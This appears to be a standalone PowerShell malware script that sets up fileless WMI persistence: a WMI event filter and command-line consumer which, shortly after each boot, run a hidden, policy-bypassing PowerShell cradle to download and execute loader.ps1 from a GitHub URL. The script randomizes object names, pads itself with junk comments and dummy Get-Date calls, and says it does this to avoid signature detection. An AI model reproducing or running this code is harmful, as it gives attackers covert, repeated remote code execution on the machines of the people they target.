$ErrorActionPreference = "SilentlyContinue"

# === Fileless WMI Persistence ===
# Strategy: 
# pceYlLFIktynQTfhvfxKOJhyyzJdrH
# 1. Do NOT drop binary to disk.
# 2. Register WMI Event to trigger on system uptime (delayed start).
# aTeIBFiJmoVVcdVWfFTfglWHBAKCqZ
# 3. Consumer executes the PowerShell Cradle to download loader.ps1.

$lxKHiemryKn = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/loader.ps1"
# Hardened Cradle (Hidden, Bypass, No Profile)
$null = Get-Date -Format "yFtc"
# We use a randomized variable for IEX to avoid simple signatures
$eEMDBhAtPQNJxrIQzLc = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$lxKHiemryKn')"""

$null = Get-Date -Format "nlum"
# 2. Randomization
$pgunBYXQkuqJGY = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
$null = Get-Date -Format "kAHX"
$MxGgtVRbbgSJXqrSB = ""
1..10 | ForEach-Object { $MxGgtVRbbgSJXqrSB += $pgunBYXQkuqJGY[(Get-Random -Maximum $pgunBYXQkuqJGY.Length)] }

# rKwcFumVUgkIbOpVpRRrpIglEVTwBg
# 3. Clean Old Persistence (if matches our pattern, optional)
Get-WmiObject __EventFilter -Namespace "root\subscription" | Where-Object { $_.Name -match "SysX" } | Remove-WmiObject

# 3. Create Trigger (Filter)
$null = Get-Date -Format "pbvu"
# Trigger: 5 minutes after boot (Uptime > 300s & < 400s)
# Optimized to run only ONCE per boot cycle
$zAdQFStzPAFniykrJaAa = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"

$uyQVqnGodBKvDjPZu = @{
    Name           = $MxGgtVRbbgSJXqrSB
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $zAdQFStzPAFniykrJaAa
}
$alrmFTKuYixzAapxlwfG = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $uyQVqnGodBKvDjPZu

# 4. Create Action (Consumer)
$null = Get-Date -Format "UjzM"
$wxGqEFPApErjarqdDX = @{
# WnghqoUclGkdsHByTHOvyymamKDtva
    Name                = $MxGgtVRbbgSJXqrSB
    CommandLineTemplate = $eEMDBhAtPQNJxrIQzLc
    RunInteractively    = $false
}
$cKBdnCLsGlYTcTVyjIf = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $wxGqEFPApErjarqdDX

# 5. Bind
$hUkRsbcqvHYPGFxoKJq = @{
$null = Get-Date -Format "cHPZ"
    Filter   = $alrmFTKuYixzAapxlwfG
$null = Get-Date -Format "dEnc"
    Consumer = $cKBdnCLsGlYTcTVyjIf
# izXhzwYSAjDAQiKtLJESHJCsBzfswh
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $hUkRsbcqvHYPGFxoKJq
$null = Get-Date -Format "tTVz"

# uDrDdTQTiidnekgFCAWQcJdwAdvWzb
Write-Host "[+] Fileless WMI Persistence Established" -ForegroundColor Green
# RvqMzwoiEWKSdjVPIzcFQHDsiMTmhe

